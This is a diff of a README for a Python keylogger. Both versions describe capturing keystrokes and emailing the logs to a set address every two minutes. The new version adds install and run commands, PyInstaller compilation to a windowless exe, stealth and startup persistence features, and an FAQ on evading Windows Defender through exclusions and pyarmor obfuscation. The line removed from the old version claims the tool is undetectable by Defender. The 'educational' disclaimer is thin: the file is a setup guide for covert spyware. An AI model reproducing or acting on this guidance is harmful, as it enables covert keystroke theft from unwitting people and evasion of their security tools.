@@ -1,32 +1,60 @@
-# Keylogger Project
+# 🖥️ Python Keylogger  
+*A lightweight, educational keylogger for Windows & Linux*  
 
-## 📝 Overview
-
-This is a **Python-based keylogger** developed strictly for **educational purposes**. It captures user keystrokes, stores them in a local file, and periodically sends logs via email. The tool can be compiled into an executable and is designed to operate in the background silently.
-
-> ✅ **Undetectable by Windows Defender as of 24/04/2025**
+> ⚠️ **Warning**: Use only for **ethical/educational purposes**. Unauthorized use is illegal.  
 
 ---
 
-## ⚙️ Features
+## 🚀 Quick Start  
+### 1️⃣ **Install Dependencies**  
+Run this in terminal (Linux/Windows):  
+```bash
+# Install Python if missing (Linux)
+sudo apt update && sudo apt install python3 python3-pip -y
 
-- 🧠 **Keystroke Logging** – Saves keystrokes into `keylog.txt`
-- 📧 **Email Delivery** – Sends keystroke logs to email every 2 minutes
-- 🕵️‍♂️ **Background Operation** – Runs quietly after being compiled to `.exe`
-- 🗂️ **Session Tracking** – Logs start and end of each session
-- 🔁 **Persistence (optional)** – Can be configured to auto-start on Windows boot
+# Install dependencies
+pip install pynput pyinstaller
+2️⃣ Download & Run
+bash
+git clone https://github.com/yourusername/keylogger.git
+cd keylogger
+python3 keylogger.py  # Or compile with PyInstaller
+3️⃣ Compile to EXE (Optional)
+bash
+pyinstaller --onefile --noconsole keylogger.py
+# Output: ./dist/keylogger.exe
+⚙️ Configuration
+Edit keylogger.py before running:
 
----
+python
+# Email settings (Gmail recommended)
+sender = "your_email@gmail.com"
+password = "your_app_password"  # Enable 2FA & generate App Password
+receiver = "receiver_email@gmail.com"
+report_interval = 120  # Email logs every 2 minutes
+🔧 Features
+📁 Local Logging: Saves to keylog.txt
 
-## ⚠️ Disclaimer
+📧 Email Reports: Auto-sends logs via SMTP
 
-This keylogger is intended **only for educational and ethical use**. Unauthorized use is **illegal**. You **must obtain permission** from the system owner before use.
+👻 Stealth Mode: No terminal popup (Windows)
 
----
+🔄 Persistence: Add to startup (Windows only)
 
-## 🚀 Installation
+❓ FAQ
+Q: How to make it undetectable?
 
-### Prerequisites
-- Python 3.6 or above
-- `pip` installed
+Disable Defender: Add exclusion for the .exe
 
+Obfuscate: Use pyarmor to encrypt the script
+
+Q: Why is my email not sending?
+
+Enable "Less Secure Apps" in Gmail or use an App Password
+
+📜 Legal Disclaimer
+This tool is for educational purposes only. The creator assumes no liability for misuse.
+
+📌 Credits
+Coded with ❤️ by [Your Name]
+🔗 GitHub: github.com/yourusername
